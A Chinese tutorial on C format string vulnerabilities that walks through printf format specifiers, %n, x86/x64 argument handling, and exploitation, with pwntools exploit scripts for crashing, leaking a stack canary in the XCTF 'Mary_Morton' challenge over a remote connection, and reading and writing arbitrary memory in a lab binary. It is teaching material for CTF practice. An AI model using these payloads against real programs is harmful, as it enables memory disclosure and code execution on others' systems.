**格式化字符串漏洞是一种威力比较大的漏洞，漏洞原因主要是因为使用类似于`printf(str)`这类语句，里面的str用户可以自己定义。轻则使程序dump，重则造成任意地址写甚至拿到shell**

# printf函数族

但凡出现格式化字符串漏洞，就少不了printf函数族。我们进去Linux的man手册中看一下都有哪些函数

    
    
    #include <stdio.h>
    
           int printf(const char *format, ...);
           int fprintf(FILE *stream, const char *format, ...);
           int dprintf(int fd, const char *format, ...);
           int sprintf(char *str, const char *format, ...);
           int snprintf(char *str, size_t size, const char *format, ...);
    
           #include <stdarg.h>
    
           int vprintf(const char *format, va_list ap);
           int vfprintf(FILE *stream, const char *format, va_list ap);
           int vdprintf(int fd, const char *format, va_list ap);
           int vsprintf(char *str, const char *format, va_list ap);
           int vsnprintf(char *str, size_t size, const char *format, va_list ap);
    

这些函数都有一个特点，都是有format格式化字符还有后面的省略号组成。在C语言中参数列表的省略号表示未定的参数，参数类型、数量都由用户自己决定。

 **另外除了printf函数族，scanf函数也会出现格式化字符串的漏洞**

# 格式化字符

我们来了解一下什么是格式化字符串(format string)。格式化字符串参数可以将特定的字符组合，进行一个转换说明。举例子来说

    
    
    #include <stdio.h>
    int main(){
        year = 2021;
        printf("hello,%d",year);
    }
    

%d就是这个特定的字符组合，该组合说明这里应该输出的是一个整型数字。

那么为什么需要格式化字符串呢？因为后面的参数并不确定(不管是个数还是数据类型)，计算机根本无法识别哪些数据是printf的参数，哪些数据是调用者的数据(因为函数调用之前就是把参数push进去)。因此如果有格式化字符串，首先系统会识别%，如果%后面跟的是正确的组合(例如d、s、p等)，然后就会判断后面的字符是否符合格式化字符串的规则，如果符合则会输出对应的数据。

单纯去讲可能有点模糊，我们不妨写一串代码，深入汇编去看一下

    
    
    #include <stdio.h>
    int main(){
    	int a = 5;
    	int b = 3;
    	char c[] = "hello world";
    	printf("a=%d,b=%d,c=%s\n",a,b,c);
    }
    //编译命令为gcc -m32 test.c -o test
    

我们来看一下调用printf时栈内的情况  
![image.png](https://image.3001.net/images/20211222/1640173548_61c30fecaed95f79e1c2c.png!small)  
很明显这里也涉及到了函数调用栈，于是我们可以尝试猜测它是怎么做的。调用函数之前首先将参数从右往左依次压栈。此时esp恰好指向格式化字符，然后对格式化字符进行读取。每当匹配到%，然后识别后面的字符是否是一个合格的格式化字符，如果是的话，就会根据读取道德格式化字符从esp往下进行读取替换。

例如，识别到%d这里，很明显%d是一个合格的格式化字符，并且这是printf读取到的第一个格式化字符，那么输出的时候就将其替换为esp-4地址的数据。后面的依次类推

**我们会发现，printf根本就不会判断参数的个数，单纯的依靠读取格式化字符然后匹配栈内的空间。漏洞就是这么来的，当然这是后话。我们接下来需要了解一下格式化字符的使用方法(使用方法很多，这里只讲我们最常用的以及格式化字符串漏洞利用需要用到的格式化字符)**

首先我们来看一下格式化字符的格式  
`%[parameter][flags][field width][.precision][length]type`  
首先是`parameter`，它的格式为n$，表示为输出第几个参数(其中n就是第n个参数)，我们来实际使用一下

    
    
    #include <stdio.h>
    int main(){
    	int a = 5;
    	int b = 3;
    	char c[] = "hello world";
    	printf("c = %3$s,a = %1$d,b = %2$d\n",a,b,c);
    }
    

最后看输出结果  
![image.png](https://image.3001.net/images/20211222/1640174253_61c312ad81eb484ae0a8e.png!small)  
那么这个如何进行实现呢？很简单，识别到格式化字符以后，根据esp的位置向下进行偏移，那么参数最后的数据就在`$esp+4n`

 **根据这个特性，格式化字符串漏洞将会出现任意地址读**

然后我们再来看`field width`，表示最小宽度。  
直接写代码走起

    
    
    #include <stdio.h>
    int main(){
    	int a = 5;
    	float pi = 3.141;
    	char c[] = "qwe";
    	printf("a=%5d,b=%5f,c=%5s\n",a,pi,c);
    }
    

然后看输出结果  
![image.png](https://image.3001.net/images/20211222/1640175102_61c315fee3be6ea564942.png!small)  
这次分别使用了整型、浮点型、字符串来测试，结果都一样：格式化字符要代替的数据输出的时候不能少于指定的宽度，如果少于指定宽度的话将会在数据前面补空格(浮点数则是包含小数点输出的数据不能少于指定宽度)

然后我们再来看`[.precision]`，表示输出的最大长度。输出的数据长度不能超过指定长度，我们还是来通过写代码来进行测试

    
    
    #include <stdio.h>
    int main(){
    	int a = 123456789;
    	float pi = 3.1415926535;
    	char c[] = "hello world!";
    	printf("a=%.5d,b=%.1f,c=%.2s\n",a,pi,c);
    }
    

然后我们看输出结果![image.png](https://image.3001.net/images/20211222/1640175566_61c317ce7820e38fc3af8.png!small)  
我们会发现最大长度对整型并没有什么影响，反而对字符串类型和浮点数类型都有限制。而且对浮点数就会表示保留指定位数的小数。但是后面我经过了一次改动

    
    
    #include <stdio.h>
    int main(){
    	int a = 12;
    	float pi = 3.1415;
    	char c[] = "hello world!";
    	printf("a=%.5d,b=%.10f,c=%.20s\n",a,pi,c);
    }
    

然后注意输出结果  
![image.png](https://image.3001.net/images/20211222/1640176454_61c31b46b4eaf30c27a14.png!small)  
也就是说针对整型数据来说，如果输出的字节数小于指定长度的话，将会在前面补0。那么b是怎么回事呢？这是因为计算机中不存在绝对精确的浮点数，只能尽可能离正确的值逼近。  
**总结：最小宽度表示要输出的变量的字节数的最小值，如果没有这么多字节，将会补空格。最大长度用在整型变量，如果输出的内容小于指定的数值，将会在整型数据前面补0，如果输出的内容长度大于最大长度，那么对整型没用作用；如果最大长度用在浮点数上，则表示保留指定位数的小数；如果用在字符串，最大长度大于字符串长度时，对字符串不起作用，如果小于，将会输出截断后的字符串**  
![image.png](https://image.3001.net/images/20211222/1640177591_61c31fb7240761e890198.png!small)![image.png](https://image.3001.net/images/20211222/1640177603_61c31fc3d59da484a117c.png!small)

 **为什么这里讲的这么细呢？因为到后面利用格式化字符串造成任意地址写就需要用到这些知识点，后面还需要知道一个比较特殊的格式化字符`%n`**

%n什么也不输出，而是将已经输出过的字节数输入到指定的地址中。我们来看一下具体使用的方式

    
    
    #include <stdio.h>
    int main(){
    	int a = 0;
    	printf("aaaa%n\n",&a);
    	printf("%d\n",a);
    }
    

我们最后看一下输出结果  
![image.png](https://image.3001.net/images/20211222/1640178337_61c322a109e2d4a7ae997.png!small)  
我们再看一下底层的汇编  
![image.png](https://image.3001.net/images/20211222/1640178531_61c323639bd1c90be50bc.png!small)  
![image.png](https://image.3001.net/images/20211222/1640178550_61c32376905fc9f88678a.png!small)

**这就是%n的功能，也是我们比较需要了解的格式化字符。格式化字符其它的使用方式就不再讲解，这些就够用了。有了这些我们也可以利用大部分的格式化字符串漏洞了**

# 漏洞利用中x86和x64的异同点

    
    
    #include <stdio.h>
    #include <unistd.h>
    int main(){
    	char str[100];
    	read(0,str,100);
    	printf(str);
    }
    

## x86

由于x86和x64的函数调用栈的过程略有差别，因此格式化字符串漏洞的利用方式也有一些不同的地方。首先我们先看x86的printf函数族的特点

首先来看x86的gdb调试，在read函数处输入`aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p`，然后我们来看栈的布局  
![image.png](https://image.3001.net/images/20211223/1640251148_61c43f0ccbd73fb30a911.png!small)  
最后看输出结果  
![image.png](https://image.3001.net/images/20211223/1640251206_61c43f46b4213265094c5.png!small)  
大家会发现输出的内容根据esp的位置直接向下进行偏移。因此我们判断在32位的程序中，每当printf识别出一个格式化字符，都会直接在栈中进行匹配。以此来举例，比方说printf识别出了第一个%p，那么它就认定esp+4地址处为它的第一个参数；当识别出第二个%p，那么它认定esp+8地址处为第二个参数，以此类推

## x64

我们再来看一下x64的情况，还是一样的代码，我们直接放到gdb中进行调试。当我们运行到read函数的时候，首先输入`aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p`，然后我们运行到printf来查看一下上下文情况  
![image.png](https://image.3001.net/images/20211223/1640251783_61c44187543365ebebfff.png!small)  
然后我们直接输出  
![image.png](https://image.3001.net/images/20211223/1640251820_61c441ac6fe1fd6635461.png!small)  
差别很明显，由于在64位程序中函数的前六个参数都会放入对应的寄存器中，因此识别前五个格式化字符(因为格式化字符串本身算一个参数，放入了rdi中)的时候都会先匹配对应的寄存器。第五个往后，则会到栈上去匹配对应的参数。而且到栈上匹配将会包含rsp(32位不包含esp，匹配参数会从esp的相邻高地址开始)

# 格式化字符串漏洞的各种利用

 **在上面一节都是合法使用printf函数的情况，但是如果非法使用printf函数会出现什么后果呢？**

我们先来尝试写一段代码

    
    
    #include <stdio.h>
    #include <unistd.h>
    int main(){
    	int a = 10;
    	printf("%p-%p-%p-%p");	
    }
    

最后看一下输出结果  
![image.png](https://image.3001.net/images/20211222/1640183447_61c3369767ee3ed187514.png!small)

**为什么会这样？之前已经讲过，printf并不会判断参数的个数，而是只会通过对格式化字符识别，然后根据esp进行定位。因此即使我们没有后续的参数，printf函数已经会根据esp进行寻址。合法的printf只是因为进行了压栈操作，因此会输出合法的变量。**  
![image.png](https://image.3001.net/images/20211222/1640183793_61c337f146f48734c2856.png!small)![image.png](https://image.3001.net/images/20211222/1640183805_61c337fd8160debfa9e4e.png!small)  
就像上图一样，我们没有后续参数，但是printf函数把栈中的地址全部打印了出来。了解了漏洞原理以后我们接下来讲解格式化字符串漏洞的利用

## 使程序崩溃

程序什么时候会崩溃？其中之一就是我们访问一些没有访问权限的地址的时候。这种利用方式甚至很无脑，直接一串`printf("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")`就可以

    
    
    #include <stdio.h>
    #include <unistd.h>
    int main(){
    	char str[100];
    	read(0,str,100);
    	printf(str);	
    }
    

很小的一个程序就可以演示  
![image.png](https://image.3001.net/images/20211222/1640179151_61c325cfaca893b35141f.png!small)  
发生了段错误，但是我们并不满足于此

## 读取栈上的数据

我们之前已经学习过了n$操作，因此我们可以对栈上的任意地址进行读取

    
    
    #include <stdio.h>
    #include <unistd.h>
    int main(){
    	char str[100];
    	read(0,str,100);
    	printf(str);
    }
    

然后使用GDB进行调试  
![image.png](https://image.3001.net/images/20211222/1640184288_61c339e0c252abf37d20c.png!small)  
我们根据我们想要读取的地址距离esp的偏移，然后计算出来就可以了。我们一般通过这种方式来泄露canary。当存在栈溢出和格式化字符串时，恰巧这时开启了canary保护，我们可以泄露出canary的地址然后绕过保护从而造成栈溢出

我们直接来看一道例题，[Mary_Morton](https://adworld.xctf.org.cn/media/task/attachments/22e2d7579d2d4359a5a1735edddef631)  
放到IDA中看一下代码逻辑  
![image.png](https://image.3001.net/images/20211223/1640244369_61c42491debdefc1b11a5.png!small)  
![image.png](https://image.3001.net/images/20211223/1640244378_61c4249aeebe485a10cc8.png!small)  
![image.png](https://image.3001.net/images/20211223/1640244388_61c424a413e9b4bc8417c.png!small)  
![image.png](https://image.3001.net/images/20211223/1640244402_61c424b2b0f79021f0db8.png!small)  
代码其实很简单，就是给用户给用户三个选项，如果选1就会进入一个有栈溢出漏洞的函数中；选2会进入一个有格式化字符串漏洞的函数；选3会退出。然后我们检查一下保护  
![image.png](https://image.3001.net/images/20211223/1640244495_61c4250f8a2c8daf36451.png!small)  
64位程序，有canary保护。然后我们注意看两个有漏洞的函数，它们的栈布局是相同的。因此我们可以直接将函数2泄露出的canary在函数1中使用。然后我们就要想办法泄露canary。打开gdb调试一波，看一下输出情况  
![image.png](https://image.3001.net/images/20211223/1640244832_61c426607229ab99ac57f.png!small)  
然后会发现它在八个a之后的第六个位置。因此我们可以通过这个来判断canary的地址，还是输入判断语句`python
print("a"*8+"-%p"*10)`，然后我们看一下运行到printf时的上下文  
![image.png](https://image.3001.net/images/20211223/1640253105_61c446b16b68a94033190.png!small)  
很明显输出的字符已经到了栈上，就在esp指针的地址处。那么我们只需要看一下canary和缓冲区之间的偏移就可以了，我们先来画一个示意图  
![image.png](https://image.3001.net/images/20211223/1640253480_61c4482841890c920c387.png!small)  
输出的前五个参数都被存放在寄存器中，输出的第六个参数也就是八个a在栈中。那么如果我们想输出canary，canary是第几个被输出的参数呢？只要寻找一下偏移就好。首先canary和栈中的八个a偏移为多少字节？很明显为0x88字节。每一个数据对齐8字节，因此算出来的偏移除以8再加上之前寄存器里的6个参数，那么canary就是第23个参数。因此我们可以通过`%23$p`来输出canary的数据。输出了canary以后这道题就是一道ret2text，还是很简单的，直接附上exp

    
    
    from pwn import *
    context.log_level = "debug"
    p = remote("111.200.241.244",64737)
    p.recvuntil("3. Exit the battle ")
    p.sendline("2")
    p.sendline("%23$p")
    p.recvuntil("0x")
    canary = int(p.recv(16),16)
    print(hex(canary))
    p.recvuntil("3. Exit the battle ")
    p.sendline("1")
    payload = "a"*0x88 + p64(canary) + "a"*8 + p64(0x4008DA)
    p.sendline(payload)
    p.interactive()
    

## 任意地址读取

我们刚才虽然讲解了栈上地址的读取，但是我们并不满足。我们想要泄露任何可以泄露的地址。接下来就讲解一下如何读取任意地址。

首先我们来写一个代码

    
    
    #include <stdio.h>
    #include <unistd.h>
    
    int main(){
    	
    	char a[] = "hello world";
    	char b[] = "hello friend";
    	printf("%s\n%s\n",a,b);
    }
    32位编译
    

先来看一下栈中的数据  
![image.png](https://image.3001.net/images/20211223/1640259472_61c45f90cac9be0589909.png!small)  
然后我们输出成功。那么如果这样呢？

    
    
    #include <stdio.h>
    #include <unistd.h>
    
    int main(){
    	printf("%s",123456);
    }
    

最后的输出会报段错误。我们不妨来想想为什么会出现这种情况？我们看上面那张图片，很明显在调用printf之前先把字符串的首地址进行压栈。然后格式化字符为%s，因此会输出地址中的值。但是如果我们随便输出一个地址，对应地址可能没有访问权限就爆出了段错误。因此我们知道了：
**%p会输出栈中的内容，而%s将会把栈中的内容作为地址进行解析，读取对应地址的内容。**

也就是说，只要我们构造方式得当，我们可以输出任何地址的内容(前提是该地址有访问权限)，构造的时候由于我们输入的所有字符串都会被当作是字符，因此输入\x也会被认为是两个字符，所以我们要借助一些工具，例如pwntools之类的工具进行输入

首先我们先写一段代码

    
    
    #include <stdio.h>
    #include <unistd.h>
    char buf[] = "hello";
    int main(){
    	printf("%p\n",buf);
    	char str[100];
    	read(0,str,100);
    	printf(str);
    	return 0;
    }
    

然后我们调试一下，查看输入的内容距离格式化字符的栈地址的偏移  
![image.png](https://image.3001.net/images/20211224/1640357548_61c5deac010c02f70429b.png!small)  
也就是说我们输入一串地址，然后输入%7$s将会输出该地址的内容。我写了一段exp的代码

    
    
    from pwn import *
    context.log_level = "debug"
    p = process("./test")
    p.recvuntil("0x")
    buf_addr = int(p.recv(7),16)//接收buf数组的地址
    print(hex(buf_addr))
    p.recvuntil("\n")
    p.sendline(p32(buf_addr)+"%7$s")//将buf的地址作为字节输入
    p.recv()
    

这里利用p32将地址作为字节进行发送，如果直接在进程中输入的话该进程将会把\x直接识别为两个字符。我们先看一下最后的结果  
![image.png](https://image.3001.net/images/20211226/1640498376_61c804c8f1e4ae98c1e07.png!small)  
由此可知，我们可以实现任意地址读取

 **我们要知道任意地址读取的主要目的是通过泄露重定位函数从而泄露libc基址。而且任意地址读取的任意是狭义上的。下面解释原因：**

**%s将会把指定地址中的数据按照字符形式(ASCII)进行输出，但是在ASCII中有一些字符是不可见字符。如果输出不可见字符的话将会被省略。那么即使程序进行输出我们也无法进行接收。如果对应地址中的数据中有至少一个可见字符，将会全部进行输出，这时我们可以进行接收**

因此我们泄露got表并不是任意GOT都能进行泄露，GOT中的对应数据至少应该有一个字节的数据转换为ASCII的时候为可见字符

下面我们先来看一下上面那个程序的重定位表  
![image.png](https://image.3001.net/images/20211226/1640498753_61c806411d0e4563b71fa.png!small)  
我们尝试使用`__libc_start_main`的got来输出函数地址，对上面的EXP进行一下修改，把倒数第二行的buf_addr改为got的地址

    
    
    from pwn import *
    context.log_level = "debug"
    p = process("./test")
    p.recvuntil("0x")
    buf_addr = int(p.recv(7),16)//接收buf数组的地址
    print(hex(buf_addr))
    p.recvuntil("\n")
    p.sendline(p32(0x804a014)+"%7$s")//将buf的地址作为字节输入
    p.recv()
    

最后来看输出结果  
![image.png](https://image.3001.net/images/20211226/1640498959_61c8070fd06f380141fe8.png!small)  
我们发现这个GOT表的数据只有一个可见字符，也就是0x30，它的ASCII值为0。如果都是不可见字符的话程序将直接省略输出，我们也就接收不到了。最后我们对比一下正确答案  
![image.png](https://image.3001.net/images/20211226/1640499067_61c8077b174661e1a7b08.png!small)

**总结：任意地址泄露可以输出对应地址的数据，但前提是相应数据中有至少一个可见字符供我们接收。我们利用这一特性可以进行泄露出GOT表中的函数从而泄露libc基址**

## 任意地址写

我们还是原来的代码

    
    
    #include <stdio.h>
    #include <unistd.h>
    char buf[] = "hello";
    int main(){
    	printf("%p\n",buf);
    	char str[100];
    	read(0,str,100);
    	printf(str);
    	return 0;
    }
    

我们需要自己写入数据，那么我们将会使用到%N$n这样的格式化字符，并且利用输出的最小宽度和最大长度对输出的字符进行填充。然后我直接上exp

    
    
    from pwn import *
    context.log_level = "debug"
    p = process("./test")
    p.recvuntil("0x")
    buf_addr = int(p.recv(7),16)
    print(hex(buf_addr))
    p.recvuntil("\n")
    p.sendline(p32(buf_addr)+"%.200p"+"%7$n"+"%7$s")
    p.recv()
    

我们本次目的是改写buf中的数据。根据输入的数据距离格式化字符串的偏移我们知道应该使用%7$n。我们首先来看一下%n的功能，先来看另一段代码

    
    
    #include <stdio.h>
    int main(){
    	int a = 0;
    	printf("aa\n");
    	printf("hello world %n\n",&a);
    	printf("%d",a);
    }
    

我们用GDB调试一下  
![image.png](https://image.3001.net/images/20211226/1640502571_61c8152b21e3e812eb4de.png!small)  
然后执行完printf之后  
![image.png](https://image.3001.net/images/20211226/1640502594_61c81542d29a332dcf52d.png!small)  
由此我们就可以知道%n会把栈中的内容当作地址进行解析，并且把已经输出的字符的数量输入到对应的地址中。

再回到上面的代码和EXP中，我们猜测一下我们将会接收到什么。首先是buf的地址，其次是一串以一堆0填充的地址。然后就是buf中的数据。我们来看一下最后的结果  
![image.png](https://image.3001.net/images/20211226/1640502737_61c815d16d86e39cf7660.png!small)  
最后的ce就是buf中的数据。已经被我们改写掉，这就是格式化字符串漏洞任意地址写。

**我们最开始输入buf的地址，就是为了在栈中放入它的地址，为后面的改写做准备。后面输入任意一个数据都可以，因为最大字长由我们控制。然后我们输入的%7$n将会把前面输出的数据的字节数放入对应的地址中，也就是buf中。后面的%s只是为了进行验证。**

 **任意地址写一般用来改写got中的函数地址，从而调用函数的时候拿到shell**

 **最后的总结：我们讲解了格式化字符串的原理，并且讲了各种漏洞利用的方式以及一些注意事项。主要还是需要清晰理解printf函数族的执行过程**

